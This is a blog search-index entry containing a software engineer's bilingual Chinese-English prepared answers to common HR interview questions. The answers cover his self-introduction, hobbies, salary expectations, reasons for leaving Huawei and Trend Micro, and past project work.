<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>IT人事面试题</title>
    <url>/2020/0102171050.html</url>
    <content><![CDATA[<!-- toc -->

<ul>
<li><a href="#%E5%85%B3%E4%BA%8E%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF%E7%9A%84%E9%97%AE%E9%A2%98">关于个人信息的问题</a><ul>
<li><a href="#could-you-give-a-brief-introduction-of-yourself-%E8%87%AA%E6%88%91%E4%BB%8B%E7%BB%8D"><strong>Could you give a brief introduction of yourself (自我介绍)</strong></a></li>
<li><a href="#tell-me-something-about-your-hobbies-%E4%BD%A0%E7%9A%84%E4%B8%9A%E4%BD%99%E7%88%B1%E5%A5%BD%E6%98%AF%E4%BB%80%E4%B9%88"><strong>Tell me something about your hobbies (你的业余爱好是什么)</strong></a></li>
</ul>
</li>
<li><a href="#%E5%85%B3%E4%BA%8E%E7%94%B3%E8%AF%B7%E5%85%AC%E5%8F%B8%E5%92%8C%E8%81%8C%E4%BD%8D%E7%9A%84%E9%97%AE%E9%A2%98">关于申请公司和职位的问题</a><ul>
<li><a href="#why-do-you-choose-our-company-%E4%BD%A0%E4%B8%BA%E4%BB%80%E4%B9%88%E5%8A%A0%E5%85%A5%E6%88%91%E4%BB%AC%E5%85%AC%E5%8F%B8"><strong>Why do you choose our company (你为什么加入我们公司)</strong></a></li>
<li><a href="#where-do-you-see-yourself-in-five-years-%E4%BD%A0%E6%9C%AA%E6%9D%A5%E4%BA%94%E5%B9%B4%E7%9A%84%E8%A7%84%E5%88%92"><strong>Where do you see yourself in five years (你未来五年的规划)</strong></a></li>
<li><a href="#when-choosing-companies-which-factors-do-you-consider-about-%E5%9C%A8%E6%89%BE%E5%B7%A5%E4%BD%9C%E6%97%B6%E4%BD%A0%E4%BC%9A%E8%80%83%E8%99%91%E5%93%AA%E4%BA%9B%E5%9B%A0%E7%B4%A0"><strong>When choosing companies, which factors do you consider about (在找工作时，你会考虑哪些因素)</strong></a></li>
<li><a href="#how-do-you-feel-about-working-overtime-%E4%BD%A0%E6%80%8E%E4%B9%88%E7%9C%8B%E5%BE%85%E5%8A%A0%E7%8F%AD"><strong>How do you feel about working overtime (你怎么看待加班)</strong></a></li>
<li><a href="#what-is-your-expected-salary-%E5%AF%B9%E8%96%AA%E8%B5%84%E7%9A%84%E8%A6%81%E6%B1%82"><strong>What is your expected salary (对薪资的要求)</strong></a></li>
<li><a href="#when-can-you-start-%E4%BD%95%E6%97%B6%E5%8F%AF%E4%BB%A5%E5%88%B0%E8%81%8C">When can you start (何时可以到职)</a></li>
</ul>
</li>
<li><a href="#%E5%85%B3%E4%BA%8E%E7%A6%BB%E8%81%8C%E5%8A%A8%E6%9C%BA%E7%9A%84%E9%97%AE%E9%A2%98">关于离职动机的问题</a><ul>
<li><a href="#why-do-you-want-to-leave-your-current-job-%E4%BD%A0%E4%B8%BA%E4%BB%80%E4%B9%88%E7%A6%BB%E8%81%8C"><strong>Why do you want to leave your current job (你为什么离职)</strong></a></li>
<li><a href="#why-do-you-want-to-leave-your-first-job-%E4%B8%BA%E4%BB%80%E4%B9%88%E7%AC%AC%E4%B8%80%E4%BB%BD%E5%B7%A5%E4%BD%9C%E7%A6%BB%E8%81%8C"><strong>Why do you want to leave your first job (为什么第一份工作离职)</strong></a></li>
<li><a href="#what-do-you-think-of-the-current-layoffs-%E4%BD%A0%E6%80%8E%E4%B9%88%E7%9C%8B%E5%BE%85%E5%BD%93%E4%B8%8B%E7%9A%84%E8%A3%81%E5%91%98"><strong>What do you think of the current layoffs (你怎么看待当下的裁员)</strong></a></li>
<li><a href="#how-do-you-look-at-job-hopping-%E4%BD%A0%E5%AF%B9%E8%B7%B3%E6%A7%BD%E7%9A%84%E7%9C%8B%E6%B3%95"><strong>How do you look at job-hopping (你对跳槽的看法)</strong></a></li>
</ul>
</li>
<li><a href="#%E5%85%B3%E4%BA%8E%E5%B7%A5%E4%BD%9C%E7%BB%8F%E5%8E%86%E7%9A%84%E9%97%AE%E9%A2%98">关于工作经历的问题</a><ul>
<li><a href="#whats-your-greatest-achievement-in-your-past-work-%E8%BF%87%E5%8E%BB%E5%B7%A5%E4%BD%9C%E4%B8%AD%E6%9C%80%E5%A4%A7%E7%9A%84%E6%88%90%E5%B0%B1%E6%98%AF%E4%BB%80%E4%B9%88"><strong>What’s your greatest achievement in your past work (过去工作中最大的成就是什么)</strong></a></li>
<li><a href="#talk-about-the-most-frustrating-experience-in-your-past-work-%E8%B0%88%E8%B0%88%E4%BD%A0%E8%BF%87%E5%8E%BB%E7%9A%84%E5%B7%A5%E4%BD%9C%E7%BB%8F%E9%AA%8C%E4%B8%AD%E6%9C%80%E4%BB%A4%E4%BD%A0%E6%8C%AB%E6%8A%98%E7%9A%84%E4%BA%8B%E6%83%85"><strong>Talk about the most frustrating experience in your past work (谈谈你过去的工作经验中，最令你挫折的事情)</strong></a></li>
<li><a href="#what-are-the-differences-between-working-at-trend-micro-and-huawei-%E4%BD%A0%E8%A7%89%E5%BE%97%E5%9C%A8%E8%B6%8B%E5%8A%BF%E7%A7%91%E6%8A%80%E5%92%8C%E5%8D%8E%E4%B8%BA%E5%85%AC%E5%8F%B8%E5%B7%A5%E4%BD%9C%E6%9C%89%E4%BB%80%E4%B9%88%E4%B8%8D%E5%90%8C"><strong>What are the differences between working at Trend Micro and Huawei (你觉得在趋势科技和华为公司工作有什么不同)</strong></a></li>
<li><a href="#what-were-the-best-aspects-of-your-last-job-%E5%AF%B9%E4%BA%8E%E7%9B%AE%E5%89%8D%E4%BB%8D%E5%9C%A8%E8%81%8C%E7%9A%84%E5%B7%A5%E4%BD%9C%E4%BD%A0%E6%9C%80%E5%96%9C%E6%AC%A2%E5%9C%B0%E6%96%B9%E6%9C%89%E5%93%AA%E4%BA%9B">What were the best aspects of your last job (对于目前仍在职的工作，你最喜欢地方有哪些)</a></li>
<li><a href="#describe-the-employee-you-most-enjoy-working-with-%E4%BD%A0%E5%96%9C%E6%AC%A2%E5%92%8C%E4%BB%80%E4%B9%88%E6%A0%B7%E7%9A%84%E5%91%98%E5%B7%A5%E5%85%B1%E4%BA%8B">Describe the employee you most enjoy working with (你喜欢和什么样的员工共事)</a></li>
<li><a href="#what-is-an-ideal-boss-like-%E4%BD%A0%E7%90%86%E6%83%B3%E7%9A%84%E8%80%81%E6%9D%BF%E4%BB%80%E4%B9%88%E6%A0%B7%E7%9A%84">What is an ideal boss like (你理想的老板什么样的)</a></li>
<li><a href="#would-you-briefly-describe-your-company-to-me-%E8%AF%B7%E4%BD%A0%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D%E4%B8%8B%E5%89%8D%E5%85%AC%E5%8F%B8">Would you briefly describe your company to me (请你简单介绍下前公司)</a></li>
<li><a href="#would-you-describe-your-typical-working-day-%E6%8F%8F%E8%BF%B0%E4%BD%A0%E4%B8%80%E5%A4%A9%E7%9A%84%E6%97%A5%E5%B8%B8%E5%B7%A5%E4%BD%9C">Would you describe your typical working day (描述你一天的日常工作)</a></li>
</ul>
</li>
<li><a href="#%E5%85%B3%E4%BA%8E%E5%9B%A2%E9%98%9F%E5%90%88%E4%BD%9C%E7%9A%84%E9%97%AE%E9%A2%98">关于团队合作的问题</a><ul>
<li><a href="#could-you-please-provide-an-overview-of-your-rd-team-%E4%BB%8B%E7%BB%8D%E4%BD%A0%E7%9A%84%E7%A0%94%E5%8F%91%E5%9B%A2%E9%98%9F%E6%83%85%E5%86%B5"><strong>Could you please provide an overview of your R&amp;D team (介绍你的研发团队情况)</strong></a></li>
<li><a href="#how-do-you-collaborate-with-your-team-%E4%BD%A0%E5%9C%A8%E9%A1%B9%E7%9B%AE%E4%B8%AD%E6%80%8E%E4%B9%88%E5%90%88%E4%BD%9C%E7%9A%84"><strong>How do you collaborate with your team (你在项目中怎么合作的)</strong></a></li>
<li><a href="#how-did-you-react-to-disagreements-between-you-and-your-boss-%E4%B8%8E%E8%80%81%E6%9D%BF%E6%84%8F%E8%A7%81%E4%B8%8D%E4%B8%80%E8%87%B4%E4%BD%A0%E6%80%8E%E4%B9%88%E5%8A%9E"><strong>How did you react to disagreements between you and your boss (与老板意见不一致，你怎么办)</strong></a></li>
<li><a href="#how-did-you-react-to-disagreements-between-you-and-your-colleague-%E4%B8%8E%E5%90%8C%E4%BA%8B%E6%84%8F%E8%A7%81%E4%B8%8D%E4%B8%80%E8%87%B4%E4%BD%A0%E6%80%8E%E4%B9%88%E5%8A%9E"><strong>How did you react to disagreements between you and your colleague (与同事意见不一致，你怎么办)</strong></a></li>
</ul>
</li>
<li><a href="#%E5%85%B3%E4%BA%8E%E8%87%AA%E6%88%91%E8%AF%84%E4%BB%B7%E7%9A%84%E9%97%AE%E9%A2%98">关于自我评价的问题</a><ul>
<li><a href="#what-are-your-strengths-as-an-employee-%E4%BD%9C%E4%B8%BA%E4%B8%80%E5%90%8D%E5%85%AC%E5%8F%B8%E5%91%98%E5%B7%A5-%E4%BD%A0%E8%A7%89%E5%BE%97%E8%87%AA%E5%B7%B1%E6%9C%89%E4%BB%80%E4%B9%88%E4%BC%98%E7%82%B9"><strong>What are your strengths as an employee (作为一名公司员工, 你觉得自己有什么优点)</strong></a></li>
<li><a href="#what-are-your-strengths-as-an-employee-%E4%BD%9C%E4%B8%BA%E4%B8%80%E5%90%8D%E5%85%AC%E5%8F%B8%E5%91%98%E5%B7%A5-%E4%BD%A0%E8%A7%89%E5%BE%97%E8%87%AA%E5%B7%B1%E6%9C%89%E4%BB%80%E4%B9%88%E7%BC%BA%E7%82%B9"><strong>What are your strengths as an employee (作为一名公司员工, 你觉得自己有什么缺点)</strong></a></li>
</ul>
</li>
<li><a href="#%E8%AF%B7%E4%BD%A0%E6%8F%90%E9%97%AE">请你提问</a><ul>
<li><a href="#%E8%83%BD%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%8B%E6%82%A8%E5%B9%B3%E6%97%B6%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%86%85%E5%AE%B9%E5%90%97-%E5%9C%A8%E5%B7%A5%E4%BD%9C%E4%B8%AD%E4%BC%9A%E7%94%A8%E5%88%B0%E5%93%AA%E4%BA%9B%E6%8A%80%E6%9C%AF%E6%A0%88">能分享一下您平时的工作内容吗? 在工作中会用到哪些技术栈</a></li>
<li><a href="#%E9%83%A8%E9%97%A8%E7%9A%84%E4%B8%BB%E8%A6%81%E4%BA%BA%E5%91%98%E5%88%86%E9%85%8D%E4%BB%A5%E5%8F%8A%E5%AF%B9%E5%BA%94%E7%9A%84%E5%B7%A5%E4%BD%9C%E8%83%BD%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D%E4%B8%80%E4%B8%8B%E5%90%97">部门的主要人员分配以及对应的工作能简单介绍一下吗？</a></li>
<li><a href="#%E8%83%BD%E4%B8%8D%E8%83%BD%E9%97%AE%E4%B8%80%E4%B8%8B%E4%BD%A0%E5%BD%93%E6%97%B6%E5%9B%A0%E4%B8%BA%E4%BB%80%E4%B9%88%E5%8E%9F%E5%9B%A0%E9%80%89%E6%8B%A9%E5%8A%A0%E5%85%A5%E8%BF%99%E5%AE%B6%E5%85%AC%E5%8F%B8%E7%9A%84%E5%91%A2%E6%88%96%E8%80%85%E8%AF%B4%E8%BF%99%E5%AE%B6%E5%85%AC%E5%8F%B8%E6%9C%89%E5%93%AA%E4%BA%9B%E5%9C%B0%E6%96%B9%E5%90%B8%E5%BC%95%E4%BD%A0">能不能问一下，你当时因为什么原因选择加入这家公司的呢或者说这家公司有哪些地方吸引你？</a></li>
<li><a href="#%E6%83%B3%E9%97%AE%E4%B8%8B%E7%9B%AE%E5%89%8D%E5%9B%A2%E9%98%9F%E6%AD%A3%E5%9C%A8%E5%A4%84%E7%90%86%E5%93%AA%E4%BA%9B%E9%87%8D%E7%82%B9%E9%A1%B9%E7%9B%AE%E8%BF%99%E4%BA%9B%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%BB%E8%A6%81%E6%8C%91%E6%88%98%E6%98%AF%E4%BB%80%E4%B9%88">想问下目前团队正在处理哪些重点项目？这些项目中遇到的主要挑战是什么</a></li>
<li><a href="#%E6%82%A8%E8%A7%89%E5%BE%97%E5%81%9A%E6%8A%80%E6%9C%AF%E5%BC%80%E5%8F%91%E5%BA%94%E8%AF%A5%E5%9C%A8%E5%85%B7%E4%BD%93%E7%9A%84%E6%9F%90%E4%B8%80%E4%B8%AA%E9%A2%86%E5%9F%9F%E9%92%BB%E7%9A%84%E6%9B%B4%E6%B7%B1%E5%91%A2%E8%BF%98%E6%98%AF%E5%BA%94%E8%AF%A5%E6%9B%B4%E5%B9%BF%E6%B3%9B%E7%9A%84%E6%B6%89%E5%8F%8A%E4%B8%8D%E5%90%8C%E9%A2%86%E5%9F%9F%E7%9A%84%E6%8A%80%E6%9C%AF%E7%9F%A5%E8%AF%86-%E5%BE%88%E5%A4%9A%E6%97%B6%E5%80%99%E8%BF%99%E4%B8%A4%E8%80%85%E6%98%AF%E7%9F%9B%E7%9B%BE%E7%9A%84">您觉得做技术开发，应该在具体的某一个领域钻的更深呢，还是应该更广泛的涉及不同领域的技术知识？ 很多时候这两者是矛盾的</a></li>
<li><a href="#%E4%BB%A5%E6%82%A8%E6%9D%A5%E7%9C%8B%E8%BF%99%E4%B8%AA%E5%B2%97%E4%BD%8D%E6%9C%AA%E6%9D%A5%E5%9C%A8%E5%85%AC%E5%8F%B8%E5%86%85%E9%83%A8%E7%9A%84%E5%8F%91%E5%B1%95%E5%A6%82%E4%BD%95-%E5%9C%A8%E6%88%91%E7%9C%8B%E6%9D%A5%E9%97%AE%E8%BF%99%E4%B8%AA%E9%97%AE%E9%A2%98%E4%B9%9F%E6%98%AF%E5%AF%B9%E4%BD%A0%E8%87%AA%E5%B7%B1%E7%9A%84%E8%B4%9F%E8%B4%A3%E5%90%A7%E8%B0%81%E4%B8%8D%E6%83%B3%E5%8F%91%E5%B1%95%E5%89%8D%E6%99%AF%E6%9B%B4%E5%A5%BD%E7%9A%84%E5%B2%97%E4%BD%8D%E5%91%A2">以您来看，这个岗位未来在公司内部的发展如何？ (在我看来，问这个问题也是对你自己的负责吧，谁不想发展前景更好的岗位呢？)</a></li>
<li><a href="#%E4%B8%8E%E5%90%8C%E8%A1%8C%E4%B8%9A%E7%9A%84%E7%AB%9E%E4%BA%89%E8%80%85%E7%9B%B8%E6%AF%94%E8%B4%B5%E5%85%AC%E5%8F%B8%E7%9A%84%E6%A0%B8%E5%BF%83%E7%AB%9E%E4%BA%89%E4%BC%98%E5%8A%BF%E5%9C%A8%E4%BB%80%E4%B9%88%E5%9C%B0%E6%96%B9">与同行业的竞争者相比，贵公司的核心竞争优势在什么地方？</a></li>
<li><a href="#%E5%85%AC%E5%8F%B8%E7%8E%B0%E5%9C%A8%E9%9D%A2%E4%B8%B4%E7%9A%84%E6%9C%80%E5%A4%A7%E6%8C%91%E6%88%98%E6%98%AF%E4%BB%80%E4%B9%88">公司现在面临的最大挑战是什么</a></li>
<li><a href="#%E8%B4%B5%E5%85%AC%E5%8F%B8%E7%9A%84%E5%8F%91%E5%B1%95%E7%9B%AE%E6%A0%87%E5%92%8C%E6%96%B9%E5%90%91%E6%98%AF%E4%BB%80%E4%B9%88">贵公司的发展目标和方向是什么？</a></li>
<li><a href="#%E6%82%A8%E8%A7%89%E5%BE%97%E5%9C%A8%E8%BF%99%E4%B8%AA%E8%81%8C%E4%BD%8D%E8%A1%A8%E7%8E%B0%E5%87%BA%E8%89%B2%E7%9A%84%E5%91%98%E5%B7%A5%E6%9C%89%E5%93%AA%E4%BA%9B%E7%89%B9%E7%82%B9">您觉得在这个职位表现出色的员工有哪些特点</a></li>
<li><a href="#%E5%8F%AF%E4%BB%A5%E8%AF%B4%E6%98%8E%E4%B8%80%E4%B8%8B%E8%B4%B5%E5%85%AC%E5%8F%B8%E7%9A%84%E6%99%8B%E5%8D%87%E6%9C%BA%E5%88%B6%E6%88%96%E5%8F%91%E5%B1%95%E8%B7%AF%E5%BE%84%E5%90%97">可以说明一下贵公司的晋升机制或发展路径吗</a></li>
<li><a href="#%E6%88%91%E6%83%B3%E7%9F%A5%E9%81%93%E8%B4%B5%E5%85%AC%E5%8F%B8%E6%98%AF%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E7%BB%A9%E6%95%88%E8%80%83%E6%A0%B8%E7%9A%84">我想知道贵公司是如何进行绩效考核的</a></li>
<li><a href="#%E6%82%A8%E8%A7%89%E5%BE%97%E8%B4%B5%E5%85%AC%E5%8F%B8%E6%9C%80%E7%9C%8B%E9%87%8D%E5%91%98%E5%B7%A5%E7%9A%84%E5%93%AA%E4%BA%9B%E5%93%81%E8%B4%A8">您觉得贵公司最看重员工的哪些品质</a></li>
</ul>
</li>
<li><a href="#%E5%85%B6%E4%BB%96%E9%97%AE%E9%A2%98">其他问题</a><ul>
<li><a href="#%E5%A6%82%E6%9E%9C%E6%B2%A1%E6%9C%89%E8%A2%AB%E5%BD%95%E7%94%A8%E4%BD%A0%E5%92%8B%E5%8A%9E">如果没有被录用，你咋办?</a></li>
</ul>
</li>
<li><a href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99">参考资料</a></li>
</ul>
<!-- tocstop -->

<span id="more"></span>

<h1><span id="关于个人信息的问题">关于个人信息的问题</span></h1><h2><span id="could-you-give-a-brief-introduction-of-yourself-自我介绍"><strong>Could you give a brief introduction of yourself (自我介绍)</strong></span></h2><p>面试官您好, 首先非常感谢贵公司给我参加这次面试的机会</p>
<p>我叫潘闯, 2019年毕业于南京大学计算机专业, 至今已有5年的Linux软件开发经验。</p>
<p>我的第一份工作从华为公司开始。 作为一名软件工程师, 我主导了单板仿真平台项目的设计与开发, 该仿真平台基于Docker和Redis技术实现, 显著提升了团队的开发效率并节省了大量的物料成本</p>
<p>之后, 我加入了趋势科技, 负责服务网关项目的设计与开发. 这个项目采用了混合云架构, 通过Microk8s集群为客户本地终端提供服务, 有效降低了客户的带宽消耗和我们的云服务费用.<br>在这个项目中, 我主动思考并实施了多项关键的改进措施, 以提高开发维护效率, 并提升用户体验.<br>例如, 为On-Premises网关设备设计了一套双分区的无缝升级方案, 解决了旧方案中升级发生故障后无法回滚的问题<br>再比如, 我重新设计了微服务的集成方案, 将微服务镜像从网关设备的固件中解耦, 使得客户升级时间缩短了40%, 从而显著改善了用户体验</p>
<p>此外, 在微服务Forward Proxy的开发过程中, 我运用HTTP知识, 结合日志分析和网络抓包，快速定位并解决了多个客户的网络问题, 体现了我的解决问题的能力</p>
<p>我相信自己的经验和技能可以为贵公司带来价值, 我期待有机会加入贵公司，与优秀的团队共同成长</p>
<p>谢谢！</p>
<p>Hello, I’m very glad to join this interview today.</p>
<p>My name is Chuang Pan. I graduated from NanJing University in 2019 with a degree in Computer Science, and I have 5 years of experience in Linux software development.</p>
<p>My first job began at Huawei. As a software engineer, I was responsible for developing a board emulation platform based on Docker and Redis,<br>which helped developers perform software testing without physical devices. This not only improved development efficiency but also saved a lot of money for the company.</p>
<p>After that, I left Huawei and came to Trend Micro. I was responsible for the feature development of Service Gateway project.<br>This gateway is built on Microk8s and provides service for On-premises Trend products, reducing customer’s bandwidth consumption</p>
<p>In this project, I implemented various optimization to enhance user experience. For example, I designed an upgrade solution for the service gateway that allows system upgrades without customers noticing<br>In addition, I optimized the microservice integration by decoupling service images from virtual appliances, reducing upgrade time by 40%, which greatly improved user experience.</p>
<p>In my work, I have always focused on improving my problem-solving abilities. For example, I can use my network knowledge to quickly resolve customer cases.<br>I provided a solution for customers with firewall configuration problems, which greatly improved user experience.</p>
<p>I believe my skills and experience can align well with your team’s needs. And I hope to join your company and grow with your team.</p>
<p>That’s all about me, Thank you very much.</p>
<h2><span id="tell-me-something-about-your-hobbies-你的业余爱好是什么"><strong>Tell me something about your hobbies (你的业余爱好是什么)</strong></span></h2><p>My favourite hobby is reading, especially reading personal blogs.<br>我的业余爱好是阅读, 尤其是喜欢阅读个人博客</p>
<p>I like reading personal blogs like yuanrifeng, findyi, coolShell and so on.<br>比如像阮一峰, findyi, 酷壳这些博客</p>
<p>These bloggers not only share technical knowledge, but also talk about life experience and career thoughts, which is very inspiring to me.<br>我觉得这些博主不仅分享技术知识，还会谈人生经历和职业思考, 这对我很有启发</p>
<p>我另一个业余爱好是打乒乓球, 通过运动放松自己, 我经常和我的小伙伴每周打两次左右<br>My another hobby is playing table tennis. I think it’s a good way to relax myself. I often play table tennis with my friends twice a week.</p>
<h1><span id="关于申请公司和职位的问题">关于申请公司和职位的问题</span></h1><h2><span id="why-do-you-choose-our-company-你为什么加入我们公司"><strong>Why do you choose our company (你为什么加入我们公司)</strong></span></h2><p>I hope to join Microsoft because you are a global leader in technology innovation. And your company provides a vast platform for personal growth.<br>我希望有机会加入微软, 因为贵公司作为全球技术创新的领导者, 为个人成长提供了广阔的平台</p>
<p>You have many famous products, such as Windows, Office, Azure, VSCode and so on, which demonstrate your strength in technology innovation.<br>从早期的windows, Office软件, 到如今的Azure, VSCode, 贵公司始终展现出强大的技术创新能力</p>
<p>I believe my skills and experience can align well with your team’s needs. And I hope to join such an exceptional company and grow with your team.<br>我相信我的技能和经验能够为团队创造价值, 同时我也期待加入微软这样一个卓越的公司, 与团队一起成长</p>
<h2><span id="where-do-you-see-yourself-in-five-years-你未来五年的规划"><strong>Where do you see yourself in five years (你未来五年的规划)</strong></span></h2><p>First of all, after join your company, I will work closely with my team and learn business as quickly as possible.<br>首先, 入职后我会积极融入团队, 快速熟悉业务流程</p>
<p>In the long term, I will choose the appropriate direction based on your career development path.<br>长期的话，我会根据公司的职业发展路径, 选择合适的方向</p>
<p>After 5 years, I hope that I have a deep understanding of a certain field and become an expert.<br>5年之后, 我希望自己能够对某一个领域有比较深入的理解, 成为某一领域的专家</p>
<h2><span id="when-choosing-companies-which-factors-do-you-consider-about-在找工作时你会考虑哪些因素"><strong>When choosing companies, which factors do you consider about (在找工作时，你会考虑哪些因素)</strong></span></h2><p>When choosing a company, I will first consider the industry and its potential for development<br>我会首先考虑行业，看这个行业的发展潜力</p>
<p>Then I will evaluate the company’s position in that industry<br>再考虑公司，看这家公司在行业中所处的地位</p>
<p>Finally, I will see if this position aligns well with my skills.<br>然后考虑职位，看这个职位跟自己专业技能的匹配度。 </p>
<p>But I think the most important factor is opportunity. Whether this position can give me enough opportunities to use my talents and grow with your team<br>当然, 我认为最重要的还是机会，这个职位能否给我带来发展机会，让我的技能得到充分的发挥，和团队一起成长</p>
<h2><span id="how-do-you-feel-about-working-overtime-你怎么看待加班"><strong>How do you feel about working overtime (你怎么看待加班)</strong></span></h2><p>In my opinion, I must be responsible since I come to work.<br>我的看法是, 既然来工作, 就必须要有责任心</p>
<p>If My job requires it, such as urgent projects or handling customer’s cases, I am willing to work overtime.<br>如果是因为工作需要加班, 比如紧急项目或者处理客户问题, 这种加班是没有问题的</p>
<p>But at the same time, We need to improve our work efficiency. It’s not desirable if the overtime is caused by delays.<br>但同时我们要注重工作效率, 如果是因为个人工作拖拉而加班, 这个是不可取的</p>
<h2><span id="what-is-your-expected-salary-对薪资的要求"><strong>What is your expected salary (对薪资的要求)</strong></span></h2><p>I am expecting a salary in the range of twenty-five thousand to twenty-eight thousand per month.<br>我对这个职位的期望月薪是25k-28k每月</p>
<p>This salary is based on my experience and my research of market.<br>这是我综合考虑了当前市场情况, 我的工作经验和技能给出的结果</p>
<p>However, I am willing to negotiate and consider additional benefits, such as stock option, bouns or paid time off.<br>不过我认为薪资是可以协商的, 我会考虑其他薪酬福利, 比如股票，奖金，带薪休假等</p>
<h2><span id="when-can-you-start-何时可以到职">When can you start (何时可以到职)</span></h2><p>I can start on April 10th, immediately after my resignation<br>我4月10号从现在公司离职，离职后可以立即到职</p>
<h1><span id="关于离职动机的问题">关于离职动机的问题</span></h1><h2><span id="why-do-you-want-to-leave-your-current-job-你为什么离职"><strong>Why do you want to leave your current job (你为什么离职)</strong></span></h2><p>I leave my position at Trend Micro because our R&amp;D center is relocating out of China.<br>我离职的原因是公司的研发中心正在撤离中国</p>
<p>This relocation is caused by geopolitical factors, such as strained relation between China and US.<br>公司撤离中国的主要原因是地缘政治因素，比如中美关系紧张</p>
<p>I had to leave my job because of these external factors. It’s not related to my personal performance, That’s all.<br>离职的原因是这些外部因素</p>
<h2><span id="why-do-you-want-to-leave-your-first-job-为什么第一份工作离职"><strong>Why do you want to leave your first job (为什么第一份工作离职)</strong></span></h2><p>(不要提加班太多)<br>I chose to leave my first job for two reasons. Firstly, at Huawei, I felt like I was more of a cog in a machine.<br>选择离开华为有两个原因。 第一个原因是，在华为工作我觉得自己就像一个螺丝钉</p>
<p>I had limited opportunities to engage with customer needs or participate in design work. This made me concerned about my technical growth and career future.<br>在华为做开发的时候, 很难接触到客户需求, 参与设计工作。 如果我继续留在华为，自己的技术视野会变得非常窄, 对于今后职业发展不利</p>
<p>Secondly, there was a lot of overtime. During peak project times, I often had to work until 1 AM. It’s difficult for me to achieve a good work-life balance.<br>第二个原因就是加班太多。 项目紧张的时候每天需要在公司干到凌晨1点钟，很难实现工作生活的平衡</p>
<p>Although I received a promotion at Huawei, I still decided to leave and seek new opportunities.<br>所以，尽管我在华为有过升职和加薪，我当时还是决定跳槽换工作</p>
<h2><span id="what-do-you-think-of-the-current-layoffs-你怎么看待当下的裁员"><strong>What do you think of the current layoffs (你怎么看待当下的裁员)</strong></span></h2><p>Layoff is a common phenomenon today. First of all, we need to be optimistic and face challenges with courage.<br>裁员是一个很普遍的现象。 作为员工, 我们首先需要保持乐观的精神，勇于面对挑战</p>
<p>We need to realize that layoff is not a negative thing, and every change may bring new opportunities.<br>我们需要认识到, 裁员并不是一件完全负面的事情, 每一次的变化都可能带来新的机遇</p>
<p>And I think it’s very important to learn new technologies continously and keep up with the times.<br>最重要的是不断提升自己的核心竞争力, 持续学习新技能, 跟上这个飞速变化的时代，努力让自己成为不可替代的人</p>
<h2><span id="how-do-you-look-at-job-hopping-你对跳槽的看法"><strong>How do you look at job-hopping (你对跳槽的看法)</strong></span></h2><p>I think people change job just to seek better development, and it’s not a problem.<br>正常的跳槽是为了寻求更好的个人发展机会, 没有什么不妥</p>
<p>But, I am against frequent job-hopping because it’s harmful to both employees and the company.<br>但频繁跳槽对个人和企业都不利，这种跳槽我反对</p>
<h1><span id="关于工作经历的问题">关于工作经历的问题</span></h1><h2><span id="whats-your-greatest-achievement-in-your-past-work-过去工作中最大的成就是什么"><strong>What’s your greatest achievement in your past work (过去工作中最大的成就是什么)</strong></span></h2><p>[TODO]<br>我过去工作中最大的成就是, 在服务网关项目中, 设计并实现了一个虚拟设备固件的升级方案. 这个方案有两大挑战:</p>
<p>一个是没有先例可循; 公司内部没有部门实现过类似的方案, 当时也没有ChatGPT, 需要基于对技术原理的理解推导一个可行方案</p>
<p>另一个挑战是涉及技术复杂多样, 比如Linux知识, 包括启动流程, 分区管理, initrd定制, ISO定制, GRUB引导程序,<br>以及K8S, Docker, HTTP, 消息队列, Python等, 需要整合这些技术实现了一个可靠的解决方案.</p>
<p>为了解决这些问题, 在设计阶段, 我积极和团队沟通, 明确升级方案的具体需求, 同时投入大量时间学习相关技术, 确保对升级流程有了清晰的认识</p>
<p>然后是模块化设计，把整个升级流程分为多个模块, 比如升级包制作模块, 在线升级模块, 定时任务模块, 每个模块专注于解决特定问题, 降低了开发难度, 提高可维护性</p>
<p>除了开发任务, 我还负责设备启动问题定位和网络问题定位, 能够快速响应并处理客户case. 解决问题能力也得到了提升</p>
<p>目前这套升级方案应用于6000多企业客户, 超过1万台虚拟设备运行。 我写的代码可以运行在世界各地的设备上, 这是一件有成就感的事</p>
<h2><span id="talk-about-the-most-frustrating-experience-in-your-past-work-谈谈你过去的工作经验中最令你挫折的事情"><strong>Talk about the most frustrating experience in your past work (谈谈你过去的工作经验中，最令你挫折的事情)</strong></span></h2><p>OK, let me tell you a challenge I encountered in my project.<br>我举一个项目中遇到的挑战</p>
<p>In Service Gateway project, customers want to deploy Virtual Appliance on AWS, but AWS didn’t support Rocky Linux OS.<br>在服务网关项目中，有些客户想把虚拟设备安装到AWS云上, 但是当时AWS并不支持RockyLinux的镜像.</p>
<p>I communicated with AWS technical support, but we were unable to find a solution.<br>我和AWS的技术支持沟通也没有解决办法.<br>After that, I kept trying to build images, but the problem remained unsolved for a week.<br>之后我就不停尝试做镜像, 结果一个礼拜也没有解决 </p>
<p>I came up with a workaround until my leader approached me. Let customer install CentOS first, then upgrade online, this eventually resolved customer’s problem.<br>直到项目经理找到我沟通, 他一句话就解决了我的问题. 让客户安装CentOS, 再通过升级的方式完成安装, 终于解决了客户问题</p>
<p>This experience taught me that when facing problems, it’s important to seek help from my team to avoid getting stuck in a dead end.<br>这次经历让我意识到, 面对问题要及时求助团队, 集思广益. 避免钻到死胡同里</p>
<h2><span id="what-are-the-differences-between-working-at-trend-micro-and-huawei-你觉得在趋势科技和华为公司工作有什么不同"><strong>What are the differences between working at Trend Micro and Huawei (你觉得在趋势科技和华为公司工作有什么不同)</strong></span></h2><p>At Huawei, the work is highly specialized. Each developer only need to focus on his specific task, such as coding and testing.<br>在华为做研发工作, 分工非常细致。 每个人只需关注自己负责的一块就能把工作完成。</p>
<p>We had limited opportunities to engage with customer requirements or participate in design work. Because design work are handled by designers.<br>很少有机会接触到需求分析, 用户体验, 因为这些都是专门的设计人员负责 </p>
<p>But at Trend Micro, our team is quite small and only has 10 members.<br>但是在趋势科技工作, 我们团队规模比较小, 只有10人左右。 </p>
<p>Besides coding and testing, we also need to analyse customer’s requirement, design system and handle customer’s cases.<br>除了编码和测试之外, 我们还需要分析客户需求, 做系统设计, 处理客户问题 </p>
